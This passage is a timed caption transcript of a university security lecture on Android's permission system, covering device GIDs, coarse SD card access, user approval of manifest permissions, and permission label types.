            <slice>
              <time_slice>49:05</time_slice>
              <text_slice>that private directory,
and no one else</text_slice>
            </slice>
            <slice>
              <time_slice>49:07</time_slice>
              <text_slice>can access it directly.</text_slice>
            </slice>
            <slice>
              <time_slice>49:10</time_slice>
              <text_slice>And then for
devices, there's also</text_slice>
            </slice>
            <slice>
              <time_slice>49:12</time_slice>
              <text_slice>a plan very similar to
network access, where</text_slice>
            </slice>
            <slice>
              <time_slice>49:15</time_slice>
              <text_slice>there's a permission string
for accessing GPS, the camera,</text_slice>
            </slice>
            <slice>
              <time_slice>49:19</time_slice>
              <text_slice>et cetera.</text_slice>
            </slice>
            <slice>
              <time_slice>49:20</time_slice>
              <text_slice>And for each one
of these, there's</text_slice>
            </slice>
            <slice>
              <time_slice>49:22</time_slice>
              <text_slice>a GID that is used in the
permissions on that device.</text_slice>
            </slice>
            <slice>
              <time_slice>49:27</time_slice>
              <text_slice>So for example, dev/camera
is owned by some magic GID.</text_slice>
            </slice>
            <slice>
              <time_slice>49:31</time_slice>
              <text_slice>And any application that should
have access to that camera</text_slice>
            </slice>
            <slice>
              <time_slice>49:35</time_slice>
              <text_slice>has that GID in its [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>49:37</time_slice>
              <text_slice>All make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>49:38</time_slice>
              <text_slice>It was hopefully fairly similar
to what you guys did in Lab 2.</text_slice>
            </slice>
            <slice>
              <time_slice>49:44</time_slice>
              <text_slice>Well, not the label part,
but the using UIDs and GIDs</text_slice>
            </slice>
            <slice>
              <time_slice>49:47</time_slice>
              <text_slice>to get somewhere [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>49:50</time_slice>
              <text_slice>Make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>49:52</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>49:54</time_slice>
              <text_slice>So one interesting question
is why do these guys</text_slice>
            </slice>
            <slice>
              <time_slice>49:56</time_slice>
              <text_slice>have such a course-grained
plan for handling the SD card?</text_slice>
            </slice>
            <slice>
              <time_slice>50:01</time_slice>
              <text_slice>Why don't they
have different apps</text_slice>
            </slice>
            <slice>
              <time_slice>50:04</time_slice>
              <text_slice>act [? with ?] different
parts of the SD card?</text_slice>
            </slice>
            <slice>
              <time_slice>50:06</time_slice>
              <text_slice>I probably have lots
of stuff in my SD card</text_slice>
            </slice>
            <slice>
              <time_slice>50:08</time_slice>
              <text_slice>that I don't want
applications to-- you know,</text_slice>
            </slice>
            <slice>
              <time_slice>50:11</time_slice>
              <text_slice>to have access to all of it.</text_slice>
            </slice>
            <slice>
              <time_slice>50:14</time_slice>
              <text_slice>Make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>50:14</time_slice>
              <text_slice>Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>50:15</time_slice>
              <text_slice>AUDIENCE: Maybe it has
something to do with [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>50:17</time_slice>
              <text_slice>that a user has to
approve those permissions.</text_slice>
            </slice>
            <slice>
              <time_slice>50:19</time_slice>
              <text_slice>And the less of them you
have, the more likely</text_slice>
            </slice>
            <slice>
              <time_slice>50:22</time_slice>
              <text_slice>it is to actually [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>50:25</time_slice>
              <text_slice>AUDIENCE: Could be.</text_slice>
            </slice>
            <slice>
              <time_slice>50:26</time_slice>
              <text_slice>Well, that's definitely a
problem in general in Android,</text_slice>
            </slice>
            <slice>
              <time_slice>50:30</time_slice>
              <text_slice>and we'll get to it in a minute.</text_slice>
            </slice>
            <slice>
              <time_slice>50:31</time_slice>
              <text_slice>But I think for the
SD card, it's actually</text_slice>
            </slice>
            <slice>
              <time_slice>50:35</time_slice>
              <text_slice>a slightly different concern.</text_slice>
            </slice>
            <slice>
              <time_slice>50:36</time_slice>
              <text_slice>It has to do with
the fact that you</text_slice>
            </slice>
            <slice>
              <time_slice>50:38</time_slice>
              <text_slice>want these SD cards
to inter-operate</text_slice>
            </slice>
            <slice>
              <time_slice>50:40</time_slice>
              <text_slice>with the rest of the world.</text_slice>
            </slice>
            <slice>
              <time_slice>50:41</time_slice>
              <text_slice>So this is like
one of the places</text_slice>
            </slice>
            <slice>
              <time_slice>50:42</time_slice>
              <text_slice>where Android isn't free to
make arbitrary decisions,</text_slice>
            </slice>
            <slice>
              <time_slice>50:45</time_slice>
              <text_slice>because you want these SD
cards to have a standard file</text_slice>
            </slice>
            <slice>
              <time_slice>50:48</time_slice>
              <text_slice>system, namely
FAT, because that's</text_slice>
            </slice>
            <slice>
              <time_slice>50:51</time_slice>
              <text_slice>the de facto standard for
storing data on an SD card</text_slice>
            </slice>
            <slice>
              <time_slice>50:54</time_slice>
              <text_slice>these days.</text_slice>
            </slice>
            <slice>
              <time_slice>50:55</time_slice>
              <text_slice>And as a result, you can't have
a sophisticated file system</text_slice>
            </slice>
            <slice>
              <time_slice>50:58</time_slice>
              <text_slice>there that stores
permissions for each file.</text_slice>
            </slice>
            <slice>
              <time_slice>51:01</time_slice>
              <text_slice>And as a result, it's
going to be difficult</text_slice>
            </slice>
            <slice>
              <time_slice>51:03</time_slice>
              <text_slice>for you to somehow
segregate these files</text_slice>
            </slice>
            <slice>
              <time_slice>51:06</time_slice>
              <text_slice>and give different
apps different access.</text_slice>
            </slice>
            <slice>
              <time_slice>51:08</time_slice>
              <text_slice>Yeah?</text_slice>
            </slice>
            <slice>
              <time_slice>51:08</time_slice>
              <text_slice>AUDIENCE: Do you still
think of [INAUDIBLE]?</text_slice>
            </slice>
            <slice>
              <time_slice>51:11</time_slice>
              <text_slice>PROFESSOR: Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>51:12</time_slice>
              <text_slice>So it might be that you
could give each application</text_slice>
            </slice>
            <slice>
              <time_slice>51:14</time_slice>
              <text_slice>a different subdirectory on
the SD card to have access to.</text_slice>
            </slice>
            <slice>
              <time_slice>51:17</time_slice>
              <text_slice>But then it would
mostly be a way</text_slice>
            </slice>
            <slice>
              <time_slice>51:20</time_slice>
              <text_slice>to give each application
additional storage and not</text_slice>
            </slice>
            <slice>
              <time_slice>51:22</time_slice>
              <text_slice>the ability for an
application to read existing</text_slice>
            </slice>
            <slice>
              <time_slice>51:25</time_slice>
              <text_slice>content from your SD card.</text_slice>
            </slice>
            <slice>
              <time_slice>51:28</time_slice>
              <text_slice>Because the existing
content might</text_slice>
            </slice>
            <slice>
              <time_slice>51:30</time_slice>
              <text_slice>be in some other directory.</text_slice>
            </slice>
            <slice>
              <time_slice>51:31</time_slice>
              <text_slice>So you're right.</text_slice>
            </slice>
            <slice>
              <time_slice>51:31</time_slice>
              <text_slice>It might be that you could
have more fine-grained things,</text_slice>
            </slice>
            <slice>
              <time_slice>51:34</time_slice>
              <text_slice>like well, you want access to
the entire SD card addressed</text_slice>
            </slice>
            <slice>
              <time_slice>51:36</time_slice>
              <text_slice>to a per app directory there.</text_slice>
            </slice>
            <slice>
              <time_slice>51:39</time_slice>
              <text_slice>And that probably has to
do with not overwhelming</text_slice>
            </slice>
            <slice>
              <time_slice>51:42</time_slice>
              <text_slice>the user with too many choices
in terms of these permissions.</text_slice>
            </slice>
            <slice>
              <time_slice>51:47</time_slice>
              <text_slice>But yeah, you're right,
you could probably</text_slice>
            </slice>
            <slice>
              <time_slice>51:50</time_slice>
              <text_slice>do some combination
of these two.</text_slice>
            </slice>
            <slice>
              <time_slice>51:53</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>51:54</time_slice>
              <text_slice>So I guess one
interesting [? thing to ?]</text_slice>
            </slice>
            <slice>
              <time_slice>51:59</time_slice>
              <text_slice>talk about is how do we decide
whether an application should</text_slice>
            </slice>
            <slice>
              <time_slice>52:10</time_slice>
              <text_slice>have a particular set of labels
that it should have access</text_slice>
            </slice>
            <slice>
              <time_slice>52:14</time_slice>
              <text_slice>to in this label set?</text_slice>
            </slice>
            <slice>
              <time_slice>52:15</time_slice>
              <text_slice>So where do these guys
actually come from?</text_slice>
            </slice>
            <slice>
              <time_slice>52:17</time_slice>
              <text_slice>Like, who decides that
this application should</text_slice>
            </slice>
            <slice>
              <time_slice>52:20</time_slice>
              <text_slice>have DIAL PERM and
INTERNET and FRIEND VIEW</text_slice>
            </slice>
            <slice>
              <time_slice>52:23</time_slice>
              <text_slice>permissions in Android?</text_slice>
            </slice>
            <slice>
              <time_slice>52:26</time_slice>
              <text_slice>Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>52:27</time_slice>
              <text_slice>AUDIENCE: The
developer [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>52:31</time_slice>
              <text_slice>PROFESSOR: Yeah, it's
a little bit of a,</text_slice>
            </slice>
            <slice>
              <time_slice>52:32</time_slice>
              <text_slice>you know, well, I guess
an upfront system, where</text_slice>
            </slice>
            <slice>
              <time_slice>52:36</time_slice>
              <text_slice>the developer has
to, first of all,</text_slice>
            </slice>
            <slice>
              <time_slice>52:38</time_slice>
              <text_slice>enumerate all the things
it'll ever need in the future</text_slice>
            </slice>
            <slice>
              <time_slice>52:40</time_slice>
              <text_slice>or as their applications
going to run.</text_slice>
            </slice>
            <slice>
              <time_slice>52:42</time_slice>
              <text_slice>And then the user is responsible
for looking over this list</text_slice>
            </slice>
            <slice>
              <time_slice>52:47</time_slice>
              <text_slice>and deciding whether
it's OK, whether they</text_slice>
            </slice>
            <slice>
              <time_slice>52:48</time_slice>
              <text_slice>should allow these application
to be installed or not.</text_slice>
            </slice>
            <slice>
              <time_slice>52:52</time_slice>
              <text_slice>And this way, the user is
still an important part</text_slice>
            </slice>
            <slice>
              <time_slice>52:55</time_slice>
              <text_slice>of the system in
terms of security,</text_slice>
            </slice>
            <slice>
              <time_slice>52:58</time_slice>
              <text_slice>because the user
could almost always</text_slice>
            </slice>
            <slice>
              <time_slice>53:01</time_slice>
              <text_slice>approve any set of
permissions you want</text_slice>
            </slice>
            <slice>
              <time_slice>53:03</time_slice>
              <text_slice>or that the developer wants.</text_slice>
            </slice>
            <slice>
              <time_slice>53:06</time_slice>
              <text_slice>So in many ways, it's
actually quite flexible,</text_slice>
            </slice>
            <slice>
              <time_slice>53:08</time_slice>
              <text_slice>because unlike something like
iOS-- where it's actually</text_slice>
            </slice>
            <slice>
              <time_slice>53:13</time_slice>
              <text_slice>difficult to share between
apps, or it's hard,</text_slice>
            </slice>
            <slice>
              <time_slice>53:15</time_slice>
              <text_slice>for example, for a third-party
iPhone application,</text_slice>
            </slice>
            <slice>
              <time_slice>53:17</time_slice>
              <text_slice>I think, to access arbitrary
other components of the phone,</text_slice>
            </slice>
            <slice>
              <time_slice>53:21</time_slice>
              <text_slice>and dial a phone, or
send an SMS message,</text_slice>
            </slice>
            <slice>
              <time_slice>53:23</time_slice>
              <text_slice>or find a JPEG viewer,
et cetera-- here,</text_slice>
            </slice>
            <slice>
              <time_slice>53:26</time_slice>
              <text_slice>it's quite flexible.</text_slice>
            </slice>
            <slice>
              <time_slice>53:27</time_slice>
              <text_slice>But sort of the cost
to it is that you</text_slice>
            </slice>
            <slice>
              <time_slice>53:31</time_slice>
              <text_slice>have to get the
developer or the user</text_slice>
            </slice>
            <slice>
              <time_slice>53:34</time_slice>
              <text_slice>to check that the
developer is asking</text_slice>
            </slice>
            <slice>
              <time_slice>53:36</time_slice>
              <text_slice>for a sensible set of
permissions or the user</text_slice>
            </slice>
            <slice>
              <time_slice>53:39</time_slice>
              <text_slice>trusts this developer
with these privileges.</text_slice>
            </slice>
            <slice>
              <time_slice>53:41</time_slice>
              <text_slice>So it's a little
bit unfortunate.</text_slice>
            </slice>
            <slice>
              <time_slice>53:43</time_slice>
              <text_slice>It's probably one of
the biggest, actually,</text_slice>
            </slice>
            <slice>
              <time_slice>53:44</time_slice>
              <text_slice>security problems in
practice with Android,</text_slice>
            </slice>
            <slice>
              <time_slice>53:46</time_slice>
              <text_slice>which is that users are
quite willing to give away</text_slice>
            </slice>
            <slice>
              <time_slice>53:49</time_slice>
              <text_slice>these permissions if they
really want an application.</text_slice>
            </slice>
            <slice>
              <time_slice>53:52</time_slice>
              <text_slice>I search for some application,
and I click Install.</text_slice>
            </slice>
            <slice>
              <time_slice>53:56</time_slice>
              <text_slice>And if it doesn't look like
a particularly long list</text_slice>
            </slice>
            <slice>
              <time_slice>53:58</time_slice>
              <text_slice>and there's nothing that
pops out right away,</text_slice>
            </slice>
            <slice>
              <time_slice>54:00</time_slice>
              <text_slice>I'll probably click OK.</text_slice>
            </slice>
            <slice>
              <time_slice>54:01</time_slice>
              <text_slice>And I might not spend the
time to really understand</text_slice>
            </slice>
            <slice>
              <time_slice>54:04</time_slice>
              <text_slice>whether these permissions
are necessary.</text_slice>
            </slice>
            <slice>
              <time_slice>54:08</time_slice>
              <text_slice>The other slight bummer is that
[INAUDIBLE] the time this paper</text_slice>
            </slice>
            <slice>
              <time_slice>54:11</time_slice>
              <text_slice>was written, Android
decided that the user</text_slice>
            </slice>
            <slice>
              <time_slice>54:15</time_slice>
              <text_slice>had only two choices--
either install the app</text_slice>
            </slice>
            <slice>
              <time_slice>54:17</time_slice>
              <text_slice>or not install the app,
which is a little bit</text_slice>
            </slice>
            <slice>
              <time_slice>54:19</time_slice>
              <text_slice>of a binary choice.</text_slice>
            </slice>
            <slice>
              <time_slice>54:20</time_slice>
              <text_slice>And the user is presumably
going to just say, well, yeah,</text_slice>
            </slice>
            <slice>
              <time_slice>54:22</time_slice>
              <text_slice>I want the app.</text_slice>
            </slice>
            <slice>
              <time_slice>54:23</time_slice>
              <text_slice>What else am I going to do?</text_slice>
            </slice>
            <slice>
              <time_slice>54:25</time_slice>
              <text_slice>I need to do this thing.</text_slice>
            </slice>
            <slice>
              <time_slice>54:27</time_slice>
              <text_slice>And I think more recently, I
think some version of Android,</text_slice>
            </slice>
            <slice>
              <time_slice>54:32</time_slice>
              <text_slice>I think 4.3, introduced
a more fine-grain scheme,</text_slice>
            </slice>
            <slice>
              <time_slice>54:35</time_slice>
              <text_slice>where the user is actually
allowed to pick and choose</text_slice>
            </slice>
            <slice>
              <time_slice>54:40</time_slice>
              <text_slice>from these permissions where--
well, you are still presented</text_slice>
            </slice>
            <slice>
              <time_slice>54:43</time_slice>
              <text_slice>with a list of permissions
that the developer wants</text_slice>
            </slice>
            <slice>
              <time_slice>54:46</time_slice>
              <text_slice>for their application to have.</text_slice>
            </slice>
            <slice>
              <time_slice>54:47</time_slice>
              <text_slice>But the user can now, in a
more fine-grained manner,</text_slice>
            </slice>
            <slice>
              <time_slice>54:51</time_slice>
              <text_slice>remove some of these permissions
from the application.</text_slice>
            </slice>
            <slice>
              <time_slice>54:54</time_slice>
              <text_slice>And it's unclear how an average
user is supposed to use this,</text_slice>
            </slice>
            <slice>
              <time_slice>54:58</time_slice>
              <text_slice>because it's probably quite
hard to go through this list</text_slice>
            </slice>
            <slice>
              <time_slice>55:01</time_slice>
              <text_slice>and make decisions about this.</text_slice>
            </slice>
            <slice>
              <time_slice>55:02</time_slice>
              <text_slice>But at least the API is
starting to show up there.</text_slice>
            </slice>
            <slice>
              <time_slice>55:07</time_slice>
              <text_slice>I haven't seen any
significant uses of it so far.</text_slice>
            </slice>
            <slice>
              <time_slice>55:10</time_slice>
              <text_slice>But it might be nice.</text_slice>
            </slice>
            <slice>
              <time_slice>55:14</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>55:16</time_slice>
              <text_slice>[INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>55:17</time_slice>
              <text_slice>Yeah?</text_slice>
            </slice>
            <slice>
              <time_slice>55:17</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>55:19</time_slice>
              <text_slice>it just lets you take away.</text_slice>
            </slice>
            <slice>
              <time_slice>55:21</time_slice>
              <text_slice>PROFESSOR: Sorry?</text_slice>
            </slice>
            <slice>
              <time_slice>55:22</time_slice>
              <text_slice>AUDIENCE: The [INAUDIBLE] just
lets you take away [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>55:27</time_slice>
              <text_slice>PROFESSOR: Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>55:27</time_slice>
              <text_slice>So I think that's basically
what this new version of Android</text_slice>
            </slice>
            <slice>
              <time_slice>55:30</time_slice>
              <text_slice>lets you do, which is you can--
instead of taking away-- well,</text_slice>
            </slice>
            <slice>
              <time_slice>55:33</time_slice>
              <text_slice>it's not labelled strings.</text_slice>
            </slice>
            <slice>
              <time_slice>55:34</time_slice>
              <text_slice>It's descriptions of
these permissions.</text_slice>
            </slice>
            <slice>
              <time_slice>55:36</time_slice>
              <text_slice>But you can actually
now-- something, I think,</text_slice>
            </slice>
            <slice>
              <time_slice>55:38</time_slice>
              <text_slice>called Android Permission
Manager lets you,</text_slice>
            </slice>
            <slice>
              <time_slice>55:41</time_slice>
              <text_slice>for every app, list
all the labeled strings</text_slice>
            </slice>
            <slice>
              <time_slice>55:44</time_slice>
              <text_slice>that the app has permission for.</text_slice>
            </slice>
            <slice>
              <time_slice>55:46</time_slice>
              <text_slice>And you could, I think,
remove these things</text_slice>
            </slice>
            <slice>
              <time_slice>55:50</time_slice>
              <text_slice>on an individual basis if
you feel strongly about them.</text_slice>
            </slice>
            <slice>
              <time_slice>55:53</time_slice>
              <text_slice>I don't know how many
users [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>55:57</time_slice>
              <text_slice>Yeah, question?</text_slice>
            </slice>
            <slice>
              <time_slice>55:57</time_slice>
              <text_slice>AUDIENCE: Whenever the labels
[? don't match up, ?] does it</text_slice>
            </slice>
            <slice>
              <time_slice>56:00</time_slice>
              <text_slice>hard-fail, or is it just that
doesn't work [INAUDIBLE]?</text_slice>
            </slice>
            <slice>
              <time_slice>56:03</time_slice>
              <text_slice>PROFESSOR: Well,
I think it depends</text_slice>
            </slice>
            <slice>
              <time_slice>56:05</time_slice>
              <text_slice>on exactly what
the application is</text_slice>
            </slice>
            <slice>
              <time_slice>56:08</time_slice>
              <text_slice>trying to do that is going
to require that label.</text_slice>
            </slice>
            <slice>
              <time_slice>56:11</time_slice>
              <text_slice>So if the application is
going to send an intent</text_slice>
            </slice>
            <slice>
              <time_slice>56:14</time_slice>
              <text_slice>and sending that intent requires
a particular label like DIAL</text_slice>
            </slice>
            <slice>
              <time_slice>56:18</time_slice>
              <text_slice>PERM, well, it
might be that you're</text_slice>
            </slice>
            <slice>
              <time_slice>56:19</time_slice>
              <text_slice>going to send the intent
to the reference monitor.</text_slice>
            </slice>
            <slice>
              <time_slice>56:21</time_slice>
              <text_slice>And the reference
monitor is going</text_slice>
            </slice>
            <slice>
              <time_slice>56:23</time_slice>
              <text_slice>to say, well, there's
no application that is</text_slice>
            </slice>
            <slice>
              <time_slice>56:25</time_slice>
              <text_slice>willing to accept your message.</text_slice>
            </slice>
            <slice>
              <time_slice>56:27</time_slice>
              <text_slice>So maybe then it's
up to the application</text_slice>
            </slice>
            <slice>
              <time_slice>56:28</time_slice>
              <text_slice>to do something
sensible in response.</text_slice>
            </slice>
            <slice>
              <time_slice>56:31</time_slice>
              <text_slice>Another possibility is that
maybe it's a network access,</text_slice>
            </slice>
            <slice>
              <time_slice>56:34</time_slice>
              <text_slice>and you don't have
access to that,</text_slice>
            </slice>
            <slice>
              <time_slice>56:35</time_slice>
              <text_slice>and you're going to make
a socket system call,</text_slice>
            </slice>
            <slice>
              <time_slice>56:38</time_slice>
              <text_slice>or you're going to say,
connect to this IP address.</text_slice>
            </slice>
            <slice>
              <time_slice>56:40</time_slice>
              <text_slice>And the kernel says, E
PERM, you can't do that.</text_slice>
            </slice>
            <slice>
              <time_slice>56:43</time_slice>
              <text_slice>And who knows what
the application</text_slice>
            </slice>
            <slice>
              <time_slice>56:44</time_slice>
              <text_slice>is going to do in that case?</text_slice>
            </slice>
            <slice>
              <time_slice>56:45</time_slice>
              <text_slice>Maybe it'll throw a null
pointer exception somehow.</text_slice>
            </slice>
            <slice>
              <time_slice>56:48</time_slice>
              <text_slice>So one argument
against doing this</text_slice>
            </slice>
            <slice>
              <time_slice>56:52</time_slice>
              <text_slice>is that Android applications,
at least originally,</text_slice>
            </slice>
            <slice>
              <time_slice>56:56</time_slice>
              <text_slice>weren't written to expect
some of their accesses</text_slice>
            </slice>
            <slice>
              <time_slice>56:59</time_slice>
              <text_slice>to fail, because they were told,
the manifest is all or nothing.</text_slice>
            </slice>
            <slice>
              <time_slice>57:02</time_slice>
              <text_slice>Either the user approves
your app, or they don't.</text_slice>
            </slice>
            <slice>
              <time_slice>57:04</time_slice>
              <text_slice>So application developers,
perhaps rightly so,</text_slice>
            </slice>
            <slice>
              <time_slice>57:09</time_slice>
              <text_slice>wrote code that
perhaps crashes or does</text_slice>
            </slice>
            <slice>
              <time_slice>57:12</time_slice>
              <text_slice>something not unexpected if
some access provision fails.</text_slice>
            </slice>
            <slice>
              <time_slice>57:18</time_slice>
              <text_slice>So it might be that by
taking away permissions,</text_slice>
            </slice>
            <slice>
              <time_slice>57:20</time_slice>
              <text_slice>you're going to cause the app to
crash if it needs that access.</text_slice>
            </slice>
            <slice>
              <time_slice>57:24</time_slice>
              <text_slice>So it's not like, well, you
know, you have this nice app,</text_slice>
            </slice>
            <slice>
              <time_slice>57:27</time_slice>
              <text_slice>and it needs access
to the camera.</text_slice>
            </slice>
            <slice>
              <time_slice>57:28</time_slice>
              <text_slice>But if you turn it off, it'll
just put on some dummy picture</text_slice>
            </slice>
            <slice>
              <time_slice>57:31</time_slice>
              <text_slice>instead.</text_slice>
            </slice>
            <slice>
              <time_slice>57:31</time_slice>
              <text_slice>Maybe it'll just crash instead.</text_slice>
            </slice>
            <slice>
              <time_slice>57:33</time_slice>
              <text_slice>So it's not great.</text_slice>
            </slice>
            <slice>
              <time_slice>57:34</time_slice>
              <text_slice>You might imagine much
more sophisticated systems</text_slice>
            </slice>
            <slice>
              <time_slice>57:36</time_slice>
              <text_slice>which, if you take away some
of the access to a camera,</text_slice>
            </slice>
            <slice>
              <time_slice>57:39</time_slice>
              <text_slice>are going to provide a
fake camera that just has</text_slice>
            </slice>
            <slice>
              <time_slice>57:41</time_slice>
              <text_slice>a black screen all the time.</text_slice>
            </slice>
            <slice>
              <time_slice>57:42</time_slice>
              <text_slice>So this is not
what Android does.</text_slice>
            </slice>
            <slice>
              <time_slice>57:44</time_slice>
              <text_slice>But you could imagine
[? alternate ?] situations</text_slice>
            </slice>
            <slice>
              <time_slice>57:46</time_slice>
              <text_slice>where this might happen.</text_slice>
            </slice>
            <slice>
              <time_slice>57:49</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>57:50</time_slice>
              <text_slice>Any other questions here?</text_slice>
            </slice>
            <slice>
              <time_slice>57:53</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>57:54</time_slice>
              <text_slice>So we've looked a
little bit at sort</text_slice>
            </slice>
            <slice>
              <time_slice>57:55</time_slice>
              <text_slice>of where these strings come from
in the label of an Android app.</text_slice>
            </slice>
            <slice>
              <time_slice>58:00</time_slice>
              <text_slice>But who defines these strings?</text_slice>
            </slice>
            <slice>
              <time_slice>58:02</time_slice>
              <text_slice>Like, where does the meaning
of a string come from?</text_slice>
            </slice>
            <slice>
              <time_slice>58:07</time_slice>
              <text_slice>You can list all kinds of
strings in your manifest file.</text_slice>
            </slice>
            <slice>
              <time_slice>58:10</time_slice>
              <text_slice>But how do you decide
which strings matter?</text_slice>
            </slice>
            <slice>
              <time_slice>58:15</time_slice>
              <text_slice>Where does this string
INTERNET or FRIEND VIEW</text_slice>
            </slice>
            <slice>
              <time_slice>58:17</time_slice>
              <text_slice>come from in the first place?</text_slice>
            </slice>
            <slice>
              <time_slice>58:19</time_slice>
              <text_slice>Who gives it meaning
in the system?</text_slice>
            </slice>
            <slice>
              <time_slice>58:30</time_slice>
              <text_slice>Any ideas?</text_slice>
            </slice>
            <slice>
              <time_slice>58:32</time_slice>
              <text_slice>Well, I think it's
mostly-- the way</text_slice>
            </slice>
            <slice>
              <time_slice>58:34</time_slice>
              <text_slice>to think of it is that
almost none of these strings</text_slice>
            </slice>
            <slice>
              <time_slice>58:38</time_slice>
              <text_slice>should be magic or
pre-defined ahead of time.</text_slice>
            </slice>
            <slice>
              <time_slice>58:43</time_slice>
              <text_slice>Almost all these
strings are basically</text_slice>
            </slice>
            <slice>
              <time_slice>58:45</time_slice>
              <text_slice>contracts between
two applications</text_slice>
            </slice>
            <slice>
              <time_slice>58:47</time_slice>
              <text_slice>so one application is
willing to export something</text_slice>
            </slice>
            <slice>
              <time_slice>58:51</time_slice>
              <text_slice>under the protection
of some label string.</text_slice>
            </slice>
            <slice>
              <time_slice>58:55</time_slice>
              <text_slice>And another application wants
to ask for that permission</text_slice>
            </slice>
            <slice>
              <time_slice>58:57</time_slice>
              <text_slice>to talk to the application
that defines this component.</text_slice>
            </slice>
            <slice>
              <time_slice>59:01</time_slice>
              <text_slice>So these labels
are typically-- you</text_slice>
            </slice>
            <slice>
              <time_slice>59:03</time_slice>
              <text_slice>can think of them
as being defined</text_slice>
            </slice>
            <slice>
              <time_slice>59:06</time_slice>
              <text_slice>by the application that
provides some protected service.</text_slice>
            </slice>
            <slice>
              <time_slice>59:09</time_slice>
              <text_slice>So if you have this
DIAL PERM permission,</text_slice>
            </slice>
            <slice>
              <time_slice>59:13</time_slice>
              <text_slice>it's presumably
something that has</text_slice>
            </slice>
            <slice>
              <time_slice>59:16</time_slice>
              <text_slice>to be defined by an application
that defines what it</text_slice>
            </slice>
            <slice>
              <time_slice>59:19</time_slice>
              <text_slice>means to dial a phone number.</text_slice>
            </slice>
            <slice>
              <time_slice>59:21</time_slice>
              <text_slice>So probably the dialer
application in your phone,</text_slice>
            </slice>
            <slice>
              <time_slice>59:23</time_slice>
              <text_slice>that's the thing that defines
the string and says that, yeah,</text_slice>
            </slice>
            <slice>
              <time_slice>59:27</time_slice>
              <text_slice>this thing, DIAL PERM,
exists, and my components</text_slice>
            </slice>
            <slice>
              <time_slice>59:30</time_slice>
              <text_slice>are going to be protected by it.</text_slice>
            </slice>
            <slice>
              <time_slice>59:31</time_slice>
              <text_slice>And then other
applications that want</text_slice>
            </slice>
            <slice>
              <time_slice>59:33</time_slice>
              <text_slice>to interact with this
guy, with the dialer,</text_slice>
            </slice>
            <slice>
              <time_slice>59:35</time_slice>
              <text_slice>can now request this DIAL PERM
permission for themselves.</text_slice>
            </slice>
            <slice>
              <time_slice>59:42</time_slice>
              <text_slice>And of course, there
are some built-in things</text_slice>
            </slice>
            <slice>
              <time_slice>59:44</time_slice>
              <text_slice>that we looked at here, like the
internet permission, the camera</text_slice>
            </slice>
            <slice>
              <time_slice>59:46</time_slice>
              <text_slice>permission, et cetera.</text_slice>
            </slice>
            <slice>
              <time_slice>59:47</time_slice>
              <text_slice>But you can sort
of think of them</text_slice>
            </slice>
            <slice>
              <time_slice>59:49</time_slice>
              <text_slice>as the Android framework being
the initial application that</text_slice>
            </slice>
            <slice>
              <time_slice>59:53</time_slice>
              <text_slice>is in charge of providing
access to this resource</text_slice>
            </slice>
            <slice>
              <time_slice>59:56</time_slice>
              <text_slice>and defining the string
that's going to protect</text_slice>
            </slice>
            <slice>
              <time_slice>59:58</time_slice>
              <text_slice>the resource as well.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:01</time_slice>
              <text_slice>What does it mean?</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:02</time_slice>
              <text_slice>What's sort of associated with
a label string in Android other</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:08</time_slice>
              <text_slice>than the fact that the string
goes into the application's</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:13</time_slice>
              <text_slice>label here when they want
to ask for this permission</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:15</time_slice>
              <text_slice>and in the component
label as well?</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:18</time_slice>
              <text_slice>So there's a couple of
things that is associated</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:21</time_slice>
              <text_slice>with the label in Android.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:24</time_slice>
              <text_slice>So a label, in
addition to a string,</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:27</time_slice>
              <text_slice>also has a couple of
interesting properties.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:30</time_slice>
              <text_slice>So there's a type of a label.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:35</time_slice>
              <text_slice>And there's, at least in
sort of a modern Android,</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:39</time_slice>
              <text_slice>there's three types
you might care about.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:42</time_slice>
              <text_slice>There's a normal type of a
label, or permission label.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:46</time_slice>
              <text_slice>There's dangerous and signature.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:55</time_slice>
              <text_slice>And the application that
defines this permission</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:00</time_slice>
              <text_slice>in the first place gets
to choose the type or all</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:03</time_slice>
              <text_slice>these other fields for
a label that we're going</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:05</time_slice>
              <text_slice>to talk about in a second.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:07</time_slice>
              <text_slice>So what's the point
of a type of a label?</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:11</time_slice>
              <text_slice>Why do labels have
